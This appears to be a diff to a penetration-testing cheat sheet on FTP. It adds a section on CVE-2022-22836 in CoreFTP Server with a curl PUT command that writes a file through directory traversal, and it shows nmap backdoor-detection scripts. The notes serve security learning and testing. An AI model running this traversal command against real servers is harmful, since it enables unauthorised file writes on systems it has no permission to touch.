@@ -11,9 +11,6 @@
 nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.10.10.10
 ```
 
-!!! tip "CVE-2022-22836"
-    CoreFTP Server version 727 and below is vulnerable to [CVE-2022-22836](https://www.exploit-db.com/exploits/50652), an authenticated exploit that allows for file directory traversal using a simple cURL request.
-
 ---
 
 ## FTP Login Syntax
@@ -90,3 +87,15 @@ grep ftp /etc/passwd
 
 !!! tip "Real-world"
     FTP is rarely exposed externally on modern networks — when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.
+
+---
+
+## Known Vulnerabilities
+
+### CVE-2022-22836
+
+CoreFTP Server version 727 and below is vulnerable to [CVE-2022-22836](https://www.exploit-db.com/exploits/50652), an authenticated exploit that allows for file directory traversal using a simple cURL request.
+
+```sh
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
